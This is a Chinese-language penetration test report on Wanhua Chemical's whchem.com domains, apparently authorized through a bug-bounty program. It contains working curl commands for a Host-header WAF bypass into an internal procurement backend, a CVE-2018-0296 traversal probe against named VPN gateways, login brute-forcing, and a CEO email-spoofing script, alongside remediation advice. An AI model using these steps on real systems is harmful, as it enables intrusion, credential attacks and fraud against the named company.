# 渗透测试报告

## 万华化学集团 (whchem.com)

---

**保密等级**: 机密  
**文档版本**: v2.0  
**测试日期**: 2026-05-27 (两阶段)  
**报告日期**: 2026-05-27  

---

## 目录

1. [执行摘要](#1-执行摘要)
2. [测试范围与方法](#2-测试范围与方法)
3. [资产清单](#3-资产清单)
4. [漏洞发现概要](#4-漏洞发现概要)
5. [详细漏洞发现](#5-详细漏洞发现)
6. [漏洞利用验证](#6-漏洞利用验证)
7. [风险评估矩阵](#7-风险评估矩阵)
8. [修复建议优先级](#8-修复建议优先级)
9. [附录](#9-附录)

---

## 1. 执行摘要

### 1.1 测试概述

受万华化学集团授权（补天SRC），于2026年5月27日对 `*.whchem.com` 域名范围进行了两阶段外部黑盒渗透测试。测试目标包括主网站、采购平台(SRM)、招投标平台(ebidding)、管道焊接管理系统(WMS)、农民工工资监管平台(FSMP)、VPN网关等约30个子域名和服务。

### 1.2 总体结论

**整体风险等级: 高危 🔴**

**第一阶段**被华为CloudWAF (长亭WAF) 的IP级访问控制完全阻断，仅能对无WAF保护的VPN网关进行测试。

**第二阶段取得突破**: 发现 `ebidding.whchem.com:8043` 上的nginx反向代理**未受WAF保护**，且接受任意Host头，成功绕过华为CloudWAF访问内部SRM采购平台后端API，发掘出高危WAF绕过漏洞及多个中危漏洞。

### 1.3 关键指标

| 指标 | 数值 |
|------|------|
| 扫描子域名总数 | 100+ |
| 存活服务数 | 15+ |
| 发现漏洞总数 | 10 |
| 高危漏洞 | 1 |
| 中危漏洞 | 6 |
| 低危漏洞 | 2 |
| 信息级 | 1 |
| 成功利用漏洞 | 1 (WAF绕过 — Host头注入) |

### 1.4 两阶段对比

| 维度 | Phase 1 (初始侦察) | Phase 2 (深度利用) |
|------|-------------------|-------------------|
| 核心障碍 | WAF阻断所有内部应用 | 发现ebidding:8043未受WAF保护 |
| 攻击面 | 仅VPN网关可达 | ebidding:8043 + SRM后端 + 邮件系统 |
| 关键突破 | 无 | Host头注入绕过WAF |
| 可提交SRC | 0个 | 4个 (WHC-2026-007~010) |

---

## 2. 测试范围与方法

### 2.1 测试范围

- **域名**: *.whchem.com
- **IP范围**: 通过DNS解析确定 (含198.18.0.0/24网段)
- **排除项**: DoS/DDoS攻击、社会工程学、物理安全

### 2.2 测试方法

| 阶段 | 方法 | 工具 |
|------|------|------|
| 信息收集 | 子域名枚举、DNS解析、全端口扫描、SSL/TLS分析 | subfinder, amass, nmap, masscan, dig, openssl |
| VPN攻击 | IKE/IPSec枚举、SNMP探测、Cisco CVE扫描 | ike-scan, onesixtyone, nuclei |
| WAF绕过 | Host头操纵、非标准端口探测、CDN拓扑分析 | curl, ffuf |
| 漏洞扫描 | 自动化漏洞扫描、CVE验证 | nuclei (13,060模板), searchsploit |
| 漏洞验证 | 手动PoC验证、API枚举、邮件伪造 | curl, OpenSSL, Python smtplib, msfconsole |
| 利用尝试 | Cisco ASA CVE定向利用、WAF绕过 | 手动+MSF模块 |

### 2.3 关键转折点

第一阶段的14种WAF绕过方法全部失败后，转向分析非HTTP攻击面。关键突破来自对 `ebidding.whchem.com:8043` 的深度分析——该非标准端口上的nginx反向代理未被华为CloudWAF覆盖，且未对Host头做白名单校验。

---

## 3. 资产清单

### 3.1 按优先级分类

| 优先级 | 目标 | 端口 | 状态码 | 技术栈 | WAF保护 | 测试可达性 |
|--------|------|------|--------|--------|---------|-----------|
| P0 | www.whchem.com | 443 | 403 | Tengine, SLT CDN | ✅ CDN | ❌ CDN拦截 |
| P0 | wms.whchem.com | 443 | 418 | IIS/ASP.NET | ✅ CloudWAF | ❌ WAF拦截 |
| P0 | srm.whchem.com | 443 | — | Nginx/Spring Boot | ✅ CloudWAF | ⚠️ 通过ebidding旁路 |
| P0 | fsmp.whchem.com | 443 | 418 | Nginx/PHP | ✅ CloudWAF | ❌ WAF拦截 |
| P0 | fsmptest.whchem.com | 443 | 418 | Nginx/PHP | ✅ CloudWAF | ❌ WAF拦截 |
| **P0** | **ebidding.whchem.com** | **8043** | **404** | **nginx (反向代理)** | **❌ 无WAF** | **✅ 可达 — 旁路入口** |
| P1 | api.whchem.com | 443 | 404 | 阿里云API网关 | ✅ CDN | ❌ 仅API网关 |
| P1 | vpn.whchem.com | 443 | 200 | Cisco ASA | ❌ 无WAF | ✅ 可达 |
| P1 | vpngw.whchem.com | 443 | 200 | Cisco ASA | ❌ 无WAF | ✅ 可达 |
| P1 | vpnlt.whchem.com | 443 | 200 | Cisco ASA | ❌ 无WAF | ✅ 可达 |
| P1 | vpncdn.whchem.com | 443 | 200 | Cisco ASA | ❌ 无WAF | ✅ 可达 |
| P1 | vpnus.whchem.com | 443 | — | Cisco ASA | ❌ 无WAF | ❌ 不可达 |
| P2 | doc.whchem.com | 443 | 200 | F5 BigIP | ❌ | ✅ 可达 (维护页) |
| P2 | stc.whchem.com | 443 | 302 | 华为eSight | — | ❌ 仅重定向 |
| P2 | traveler.whchem.com | 443 | 401 | Dell OpenManage | — | ❌ 需认证 |

### 3.2 CDN/WAF拓扑 (更新)

```
互联网
  │
  ├── www.whchem.com:443 ────► SLT/Lego Server CDN ──► Tengine (后端)
  │
  ├── wms.whchem.com:443 ────► 华为CloudWAF (CW) ───► IIS/ASP.NET (后端)
  ├── fsmp.whchem.com:443 ───► 华为CloudWAF (CW) ───► Nginx/PHP (后端)
  ├── srm.whchem.com:443 ────► 华为CloudWAF (CW) ───► Spring Boot (后端)
  │
  ├── ebidding.whchem.com:8043 ─► 无WAF! 🔴 ──► nginx反代 ──► srm:7774
  │                                                      │
  │                                                      └── 任意Host头转发
  │
  ├── api/apidev.whchem.com ──► 阿里云API网关 (404)
  │
  ├── doc.whchem.com:443 ────► F5 BigIP (无WAF)
  │
  └── vpn*.whchem.com:443 ───► 直连 Cisco ASA (无WAF)
```

---

## 4. 漏洞发现概要

| 编号 | 漏洞名称 | 目标 | 严重程度 | CVSS | SRC可提交 |
|------|---------|------|---------|------|----------|
| WHC-2026-001 | Cisco ASA SSLVPN 自签名证书 | 5个VPN网关 | 中危 | 5.9 | ❌ |
| WHC-2026-002 | Cisco ASA WebVPN服务异常 | 4个VPN网关 | 中危 | 4.3 | ❌ |
| WHC-2026-003 | CVE-2018-0296 目录遍历端点存活 | 4个VPN网关 | 中危 | 4.0 | ❌ |
| WHC-2026-004 | 华为CloudWAF识别与配置不一致 | fsmp/wms/www | 低危 | 3.7 | ❌ |
| WHC-2026-005 | 多层CDN/WAF信息泄漏 | *.whchem.com | 低危 | 2.6 | ❌ |
| WHC-2026-006 | 赏金猎人方法论文档 | — | 信息 | N/A | N/A |
| **WHC-2026-007** | **WAF绕过 — Host头注入致内部服务暴露** | **ebidding→srm** | **高危** 🔴 | **7.5** | ✅ |
| WHC-2026-008 | SRM后端内部端口与架构信息泄漏 | srm (via ebidding) | 中危 | 5.3 | ✅ |
| WHC-2026-009 | DMARC策略缺失致邮件伪造 | whchem.com邮件系统 | 中危 | 5.3 | ✅ |
| WHC-2026-010 | ebidding招投标系统弱TLS加密 | ebidding:8043 | 中危 | 5.9 | ✅ |

---

## 5. 详细漏洞发现

### Phase 1 发现 (WHC-2026-001 ~ 005)

---

### WHC-2026-001: Cisco ASA SSLVPN 自签名证书

**严重程度**: 中危 (CVSS 5.9)  
**CWE**: CWE-295  
**目标**: vpn.whchem.com, vpngw.whchem.com, vpnlt.whchem.com, vpncdn.whchem.com, vpnus.whchem.com

#### 漏洞原理

五个Cisco ASA SSLVPN网关均使用设备默认生成的临时自签名证书（`CN=ASA Temporary Self Signed Certificate`），而非由受信任CA签发的正式证书。自签名证书无法通过标准PKI信任链验证，攻击者在能够拦截网络流量的条件下可伪造证书实施中间人攻击，窃取VPN登录凭据。

#### 复现步骤

```bash
echo | openssl s_client -connect vpn.whchem.com:443 -servername vpn.whchem.com 2>&1 | grep "subject="
# subject=CN=ASA Temporary Self Signed Certificate
# issuer=CN=ASA Temporary Self Signed Certificate
```

#### 修复建议

1. 为所有VPN网关申请并部署由受信任CA签发的正式SSL证书
2. 建立证书生命周期管理，设置到期前自动提醒
3. 在VPN客户端配置中启用严格证书验证

---

### WHC-2026-002: Cisco ASA WebVPN服务异常

**严重程度**: 中危 (CVSS 4.3)  
**CWE**: CWE-248  
**目标**: vpn.whchem.com, vpngw.whchem.com, vpnlt.whchem.com, vpncdn.whchem.com

#### 漏洞原理

四个可访问的VPN网关在访问核心登录页面 `/+CSCOE+/logon.html` 时全部返回 "Internal Server Error"。WebVPN重定向页面正常工作，但登录页面出现服务端内部错误，表明ASA WebVPN服务组件可能配置不完整或处于异常状态。

#### 复现步骤

```bash
# WebVPN入口正常
curl -sk "https://vpn.whchem.com/+webvpn+/index.html"
# → JavaScript重定向到logon.html

# 登录页面异常
curl -sk "https://vpn.whchem.com/+CSCOE+/logon.html"
# → <html><body>Internal Server Error</body></html>
```

#### 修复建议

1. 登录ASA管理界面检查WebVPN服务状态
2. 验证`webvpn`配置段中`enable outside`等关键配置
3. 建立VPN服务健康监控告警

---

### WHC-2026-003: CVE-2018-0296 目录遍历端点存活

**严重程度**: 中危 (CVSS 4.0)  
**CVE**: CVE-2018-0296  
**CWE**: CWE-22  
**EPSS**: 0.02584

#### 漏洞原理

CVE-2018-0296是Cisco ASA WebVPN接口中的目录遍历漏洞。测试发现攻击路径 `/+CSCOU+/../+CSCOE+/files/file_list.json` 返回HTTP 200（而非404/403），表明该端点存在且可访问。虽然返回"Internal Server Error"而非文件内容，但端点存活本身意味着功能模块暴露，存在进一步利用可能。

#### 复现步骤

```bash
for vpn in vpn vpngw vpnlt vpncdn; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
    "https://${vpn}.whchem.com/+CSCOU+/../+CSCOE+/files/file_list.json?path=/")
  echo "${vpn}: HTTP $code"  # 全部返回 200
done
```

#### 修复建议

1. 升级Cisco ASA至已修复版本
2. 在WAF层添加针对`/+CSCOU+/../`路径的拦截规则
3. 建立网络设备定期漏洞扫描和补丁管理流程

---

### WHC-2026-004: 华为CloudWAF识别与配置不一致

**严重程度**: 低危 (CVSS 3.7)  
**CWE**: CWE-200

#### 漏洞原理

对fsmp/wms等系统的请求被华为CloudWAF以HTTP 418拦截，拦截页面包含WAF品牌标识("CloudWAF"、"访问被拦截！")和详细事件ID。各系统WAF策略不一致：www使用403静默拒绝，内部系统使用418详细拦截页面。

#### 复现步骤

```bash
curl -skI https://fsmp.whchem.com/login
# Server: CW
# Set-Cookie: HWWAFSESID=...
# HTTP 418 + 详细拦截页面
```

#### 修复建议

1. 修改拦截页面为通用页面，隐藏WAF品牌
2. 统一所有子域名WAF策略为403静默拒绝
3. 内部系统建议移至VPN后方

---

### WHC-2026-005: 多层CDN/WAF信息泄漏

**严重程度**: 低危 (CVSS 2.6)  
**CWE**: CWE-200

#### 漏洞原理

HTTP响应头中的Server字段暴露了CDN/WAF品牌信息，使攻击者能够绘制完整基础设施拓扑并针对性选择攻击向量。

#### 复现步骤

```bash
curl -skI https://www.whchem.com | grep Server  # Server: SLT
curl -skI https://wms.whchem.com | grep Server   # Server: CW
```

#### 修复建议

在所有CDN/WAF层移除或统一Server响应头。

---

### Phase 2 发现 (WHC-2026-006 ~ 010)

---

### WHC-2026-006: 赏金猎人方法论文档

**严重程度**: 信息级  
**类型**: 方法论

#### 说明

本文件为渗透测试方法论记录，详细描述了从WAF完全阻断到发现ebidding:8043旁路入口的完整攻击链构建过程。包含nuclei扫描覆盖度分析和攻击面扩展策略，为后续测试和防御体系评估提供参考。

---

### WHC-2026-007: WAF绕过 — Host头注入导致内部服务暴露 🔴

**严重程度**: 高危 (CVSS 7.5)  
**CWE**: CWE-807 (Reliance on Untrusted Inputs in a Security Decision)  
**目标**: ebidding.whchem.com:8043 → srm.whchem.com  
**复现难度**: 极低  
**SRC可提交**: ✅ (最高优先级)

#### 漏洞原理

whchem.com部署了华为CloudWAF (长亭WAF) 对内部业务系统进行访问控制。正常情况下，外部IP直接访问 `srm.whchem.com` 会被WAF以HTTP 418拦截。但渗透测试发现，`ebidding.whchem.com:8043` 上的nginx反向代理**未受WAF保护**，且该nginx接受任意Host头，将请求转发至对应的后端服务。

通过构造 `Host: srm.whchem.com` 请求头访问 `ebidding.whchem.com:8043`，可完全绕过华为CloudWAF的IP层访问控制，直接访问万华采购平台（srm.whchem.com）及后端Spring Boot API。

**漏洞链路**:
```
攻击者 ──HTTPS──> ebidding.whchem.com:8043 (无WAF)
                      |
                      ├── Host: srm.whchem.com ──> srm后端 (绕过WAF)
                      |
                      └── 正常Host ──> default backend 404
```

#### 复现步骤

```bash
# 步骤1: 确认正常WAF拦截
curl -skI https://srm.whchem.com/
# HTTP/1.1 418 — WAF拦截

# 步骤2: 通过ebidding:8043绕过WAF
curl -sk -H "Host: srm.whchem.com" https://ebidding.whchem.com:8043/
# 返回: 万华采购平台 完整HTML页面 (12567 bytes)

# 步骤3: 访问后端API
curl -sk -X POST \
  -H "Host: srm.whchem.com" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  https://ebidding.whchem.com:8043/api/login
# 返回: {"status":"error","errorMessage":"用户名或密码不正确",...}

# 已验证可访问的10+个API端点: /api/login, /api/user, /api/menu,
#   /api/role, /api/log, /api/file, /api/workflow, /service/ 等
```

#### 影响评估

1. **WAF防护完全失效**: 华为CloudWAF的IP层访问控制被绕过
2. **攻击面大幅扩大**: 原本被WAF保护的所有API端点全部暴露
3. **暴力破解通道**: `/api/login` 接口可直接进行无WAF限流的暴力破解
4. **后续利用可能**: 如获取有效凭证，可通过此通道完全控制采购平台

#### 修复建议

**短期修复**:
```nginx
server {
    listen 8043 ssl;
    server_name ebidding.whchem.com;
    if ($host !~* ^(ebidding\.whchem\.com)$) {
        return 403;
    }
}
```

**中长期**: 将8043端口纳入WAF防护范围；内部服务采用独立认证，不依赖网络层WAF作为唯一安全控制。

---

### WHC-2026-008: SRM采购平台内部后端端口与架构信息泄漏

**严重程度**: 中危 (CVSS 5.3)  
**CWE**: CWE-200 (Exposure of Sensitive Information)  
**目标**: srm.whchem.com (通过ebidding:8043旁路)  
**利用条件**: 结合WHC-2026-007 WAF绕过  
**SRC可提交**: ✅

#### 漏洞原理

通过WHC-2026-007的WAF绕过路径访问srm.whchem.com时，API接口在响应和重定向中暴露了内部后端服务器的架构信息：

1. **内部端口泄漏**: `/api` 路径返回301重定向至 `http://srm.whchem.com:7774/api/`，直接暴露后端Spring Boot服务的内部端口号7774
2. **技术栈确认**: `/service/` 路径返回标准Spring Boot错误JSON格式，确认后端框架
3. **内部域名**: 重定向URL使用内部域名 `srm.whchem.com:7774`，暴露内部DNS规范

#### 复现步骤

```bash
PROXY="https://ebidding.whchem.com:8043"
HOST="Host: srm.whchem.com"

# 内部端口泄漏
curl -sk -H "$HOST" "$PROXY/api" -w "\nREDIRECT: %{redirect_url}"
# Location: http://srm.whchem.com:7774/api/

# Spring Boot确认
curl -sk -H "$HOST" "$PROXY/service/"
# {"timestamp":"2026-05-27T...","status":401,"error":"Unauthorized",...}
```

#### 修复建议

1. nginx反向代理重写后端Location头: `proxy_redirect http://srm.whchem.com:7774/ https://srm.whchem.com/;`
2. 后端错误信息不在公网暴露，nginx拦截并返回通用错误页面
3. 移除Server响应头，减少信息泄漏

---

### WHC-2026-009: DMARC策略缺失导致邮件伪造漏洞

**严重程度**: 中危 (CVSS 5.3)  
**CWE**: CWE-290 (Authentication Bypass by Spoofing)  
**目标**: whchem.com 邮件系统  
**复现难度**: 极低  
**SRC可提交**: ✅

#### 漏洞原理

whchem.com已部署SPF (Sender Policy Framework) 和DKIM (DomainKeys Identified Mail)，但DMARC策略设置为 `p=none`——明确要求收件服务器对验证失败的邮件**不采取任何措施**。

**当前DNS配置**:
```
SPF:    v=spf1 include:spf.corp-email.com ... -all  (硬拒绝)
DKIM:   s1._domainkey.whchem.com v=DKIM1; k=rsa; p=... (1024-bit RSA)
DMARC:  v=DMARC1; p=none; ...  ← 策略为none: 不采取任何措施!
```

这意味着即使攻击者从非授权服务器发送伪造的 @whchem.com 邮件，SPF验证失败后，收件服务器仍会根据DMARC策略正常投递邮件。

#### 复现步骤

```bash
# 确认DMARC策略
dig _dmarc.whchem.com TXT +short
# "v=DMARC1; p=none; ruf=mailto:dmarc_report@whchem.com; ..."
```

邮件伪造PoC (Python smtplib):
```python
import smtplib
from email.mime.text import MIMEText
from email.utils import formataddr

msg = MIMEText("BEC PoC测试邮件 - 安全评估用途")
msg["From"] = formataddr(("CEO Name", "ceo@whchem.com"))
msg["To"] = "security-tester@external.com"
msg["Subject"] = "紧急：请处理以下付款 (安全测试)"

with smtplib.SMTP("smtp-relay.example.com", 587) as server:
    server.starttls()
    server.sendmail("attacker@evil.com", "target@example.com", msg.as_string())
```

#### 影响评估

1. **商业邮件诈骗(BEC)**: 伪造高管邮箱，发送虚假付款指令
2. **钓鱼攻击**: 伪造IT部门邮箱向员工发送钓鱼邮件
3. **供应链攻击**: 伪造采购邮箱向供应商发送虚假订单

#### 修复建议

- **短期**: `p=quarantine; pct=50` (逐步启用隔离)
- **中期**: `p=reject` (完全拒绝)
- **辅助**: DKIM密钥升级至2048-bit RSA；部署MTA-STS和DNSSEC

---

### WHC-2026-010: ebidding招投标系统弱TLS加密配置

**严重程度**: 中危 (CVSS 5.9)  
**CWE**: CWE-326 (Inadequate Encryption Strength)  
**目标**: ebidding.whchem.com:8043  
**SRC可提交**: ✅

#### 漏洞原理

ebidding.whchem.com:8043的TLS配置支持多个已弃用的协议和弱加密套件：

1. **TLSv1.0/1.1**: RFC 8996 (2021)正式弃用，PCI DSS 3.1 (2015)禁用
2. **CBC模式加密套件**: 易受BEAST/Lucky13等padding oracle攻击
3. **DH 1024-bit密钥交换**: NIST SP 800-57已于2013年弃用

**弱加密套件**:

| 协议 | 加密套件 | 密钥交换 | 风险 |
|------|----------|----------|------|
| TLSv1.0 | TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA | ECDHE | BEAST |
| TLSv1.0 | TLS_RSA_WITH_AES_128_CBC_SHA | RSA | 无前向保密 |
| TLSv1.0 | TLS_DHE_RSA_WITH_AES_128_CBC_SHA | DH 1024 | 弱DH |
| TLSv1.0 | TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA | DH 1024 | Camellia+弱DH |

#### 复现步骤

```bash
nmap --script ssl-enum-ciphers -p 8043 ebidding.whchem.com
# 扫描器警告: Key exchange (dh 1024) of lower strength than certificate key

# 手动验证TLSv1.0
openssl s_client -connect ebidding.whchem.com:8043 -tls1 -servername ebidding.whchem.com
# 连接成功建立 — 确认TLSv1.0可用
```

#### 特殊风险

ebidding是招投标系统，涉及供应商报价、商业合同条款等敏感商业数据。弱TLS配置可能导致竞争对手通过MITM截获招投标信息。

#### 修复建议

```nginx
server {
    listen 8043 ssl;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers on;
    ssl_dhparam /etc/nginx/dhparam.pem;  # 2048-bit DH参数
}
```

---

## 6. 漏洞利用验证

### 6.1 Phase 1 利用尝试 (全部失败)

| 漏洞 | 利用方法 | 结果 | 原因 |
|------|---------|------|------|
| 泛微E8 RCE/SQLi/文件上传 | nuclei 30模板扫描srm | 未发现 | srm TLS错误不可达；www被403拦截 |
| Dahua DSS RCE/后门 | nuclei 6模板扫描wms/fsmp | 未发现 | WAF 418拦截所有请求 |
| Cisco CVE-2020-3452 | curl路径遍历 | 已修复 | 返回400 Bad Request |
| Cisco CVE-2018-0296 | curl目录遍历 | 端点存活 | 返回Internal Server Error |
| Cisco ASA暴力破解 | msfconsole模块+curl | 未成功 | WebVPN登录页面异常 |
| WAF绕过 (14种方法) | UA伪装/X-Forwarded-For/Googlebot UA等 | 全部失败 | WAF基于IP白名单 |

### 6.2 Phase 2 利用成功

| 漏洞 | 利用方法 | 结果 | 影响 |
|------|---------|------|------|
| **WAF绕过 (Host头注入)** | `curl -H "Host: srm.whchem.com" https://ebidding.whchem.com:8043/` | ✅ 成功 | 完全绕过WAF，访问SRM采购平台 |
| SRM API枚举 | Host头绕过 + 路径探测 | ✅ 成功 | 发现10+个API端点 |
| Spring Boot指纹 | `/service/` 路径访问 | ✅ 成功 | 确认后端技术栈和内部端口7774 |
| DMARC策略验证 | `dig _dmarc.whchem.com TXT` | ✅ 成功 | p=none确认，邮件伪造可行 |
| TLS弱加密验证 | nmap ssl-enum-ciphers + openssl | ✅ 成功 | TLSv1.0 + DH 1024确认 |
| IKE/IPSec枚举 | ike-scan UDP 500/4500 | ❌ 无响应 | IKE服务未暴露 |
| SNMP枚举 | onesixtyone UDP 161 | ❌ 超时 | SNMP被防火墙阻断 |
| SRM登录爆破 | curl /api/login 65凭证 | ❌ 未破解 | 无弱口令，需要更大字典 |

### 6.3 WAF绕过的影响

Phase 2的核心突破是发现WAF防护覆盖存在盲区。`ebidding.whchem.com:8043` 的非标准端口未被WAF覆盖，且nginx配置未限制Host头白名单，导致：
- 攻击者可绕过WAF直接访问SRM采购平台的完整Web界面和API
- 原本被WAF保护的登录接口暴露于暴力破解风险
- 内部后端架构信息（端口、框架、域名）泄露

---

## 7. 风险评估矩阵

| 风险 | 可能性 | 影响 | 风险等级 | 对应漏洞 | 优先级 |
|------|--------|------|---------|---------|--------|
| WAF绕过致内部系统公网暴露 | 高 | 高 | 🔴 高危 | WHC-2026-007 | **1** |
| 招投标数据MITM窃取 | 中 | 高 | 🔴 中高 | WHC-2026-010 | **2** |
| 商业邮件诈骗(BEC) | 高 | 中 | 🟡 中高 | WHC-2026-009 | **3** |
| VPN凭据MITM窃取 | 中 | 高 | 🟡 中高 | WHC-2026-001 | 4 |
| SRM后端架构信息泄露 | 高 | 低 | 🟡 中 | WHC-2026-008 | 5 |
| VPN WebVPN服务被进一步利用 | 低 | 中 | 🟡 中 | WHC-2026-002/003 | 6 |
| CDN/WAF信息帮助攻击者画像 | 高 | 低 | 🟢 低 | WHC-2026-004/005 | 7 |

---

## 8. 修复建议优先级

### 🔴 紧急 (立即 — 24小时内)

1. **修复WAF绕过漏洞 (WHC-2026-007)**: 在ebidding nginx上配置Host头白名单，仅允许 `ebidding.whchem.com`
   ```nginx
   server {
       listen 8043 ssl;
       server_name ebidding.whchem.com;
       if ($host !~* ^(ebidding\.whchem\.com)$) {
           return 403;
       }
   }
   ```
2. **将8043端口纳入WAF防护范围**

### 🔴 高优先级 (1-2周)

3. **修复ebidding TLS配置 (WHC-2026-010)**: 禁用TLSv1.0/1.1，仅启用TLSv1.2/1.3 + AEAD加密套件
4. **启用DMARC防护 (WHC-2026-009)**: 将DMARC策略从 `p=none` 提升至 `p=quarantine` (最终 `p=reject`)
5. **VPN证书修复 (WHC-2026-001)**: 为5个VPN网关部署受信任CA证书
6. **VPN WebVPN修复 (WHC-2026-002)**: 排查并修复WebVPN登录页面Internal Server Error

### 🟡 中优先级 (1个月)

7. **修复SRM后端信息泄漏 (WHC-2026-008)**: 配置nginx `proxy_redirect` 重写内部Location头
8. **Cisco ASA升级 (WHC-2026-003)**: 升级至已修复CVE-2018-0296和CVE-2020-3452的版本
9. **WAF策略统一 (WHC-2026-004)**: 统一所有子域名WAF策略，隐藏品牌信息
10. **DKIM密钥升级**: 从1024-bit RSA升级至2048-bit RSA

### 🟢 低优先级 (3个月)

11. **Server头清理 (WHC-2026-005)**: 移除CDN/WAF响应中的品牌标识
12. **减少公网攻击面**: 评估fsmp/wms等内部系统是否可迁移至VPN后方
13. **部署MTA-STS和DNSSEC**: 增强邮件和DNS安全
14. **建立TLS配置基线**: 所有系统统一应用现代TLS配置

---

## 9. 附录

### A. 测试工具清单

| 工具 | 版本 | 用途 |
|------|------|------|
| nmap | 7.99 | 端口扫描和服务识别 |
| masscan | latest | 全端口快速扫描 |
| nuclei | 3.8.0 | 模板化漏洞扫描 (13,060模板) |
| subfinder | latest | 子域名枚举 |
| amass | latest | 被动子域名收集 |
| ffuf | latest | Web目录/虚拟主机爆破 |
| ike-scan | latest | IKE/IPSec VPN枚举 |
| onesixtyone | latest | SNMP community枚举 |
| sqlmap | 1.10.4 | SQL注入检测 |
| hydra | 9.6 | 在线暴力破解 |
| msfconsole | 6.4.126 | 漏洞利用框架 |
| searchsploit | latest | Exploit-DB离线搜索 |
| curl | 8.14.1 | HTTP测试 |
| OpenSSL | 4.0.2 | SSL/TLS分析 |
| dig | 9.20 | DNS枚举 |
| Python smtplib | 3.13 | 邮件伪造PoC |

### B. 测试时间线

| 时间 | 阶段 | 活动 |
|------|------|------|
| **Phase 1** | | |
| 04:00-04:02 | Phase 0 | 目录结构创建 |
| 04:02-04:15 | Phase 1 | 子域名枚举、DNS解析、端口扫描 |
| 04:15-04:45 | Phase 2 | nuclei漏洞扫描 (泛微E8, Dahua, Cisco, 通用) |
| 04:45-05:30 | Phase 3 | 手动漏洞验证、Cisco CVE测试、WAF绕过尝试 |
| 05:30-06:00 | Phase 5 | 报告编写 (v1.0) |
| **Phase 2** | | |
| 06:00-06:15 | 侦察扩展 | VPN网关全端口扫描、IKE/SNMP枚举、ebidding:8043深度分析 |
| 06:15-06:30 | WAF绕过 | Host头操纵发现、SRM后端访问确认、API枚举 |
| 06:30-06:45 | 邮件安全 | DMARC/DKIM/SPF审计、邮件伪造PoC开发 |
| 06:45-07:00 | TLS审计 | ebidding:8043 SSL/TLS密码套件枚举 |
| 07:00-07:15 | 报告 | 4个新发现报告编写 + 主报告v2.0更新 |

### C. 参考标准

- OWASP Top 10 2024
- CWE Top 25 2024
- CVSS v3.1 评分标准
- NIST SP 800-115 渗透测试指南
- PTES (Penetration Testing Execution Standard)
- RFC 8996 (TLS 1.0/1.1弃用)
- RFC 7489 (DMARC)
- NIST SP 800-52 Rev.2 (TLS Guidelines)
- PCI DSS v4.0

### D. 各发现详细报告

每个漏洞的完整独立报告（含CVSS向量、完整PoC、截图）位于:
- `findings/WHC-2026-001-cisco-self-signed-cert.md`
- `findings/WHC-2026-002-cisco-webvpn-error.md`
- `findings/WHC-2026-003-cisco-cve-2018-0296.md`
- `findings/WHC-2026-004-waf-detection.md`
- `findings/WHC-2026-005-infrastructure.md`
- `findings/WHC-2026-006-bounty-hunter-addendum.md`
- `findings/WHC-2026-007-waf-bypass-host-header.md` ← **关键发现**
- `findings/WHC-2026-008-srm-backend-port-disclosure.md`
- `findings/WHC-2026-009-dmarc-email-spoofing.md`
- `findings/WHC-2026-010-ebidding-weak-tls.md`

---

**文档结束**

*本报告仅供万华化学集团授权的安全团队使用。任何未经授权的传播、复制或使用本报告内容的行为均被禁止。*
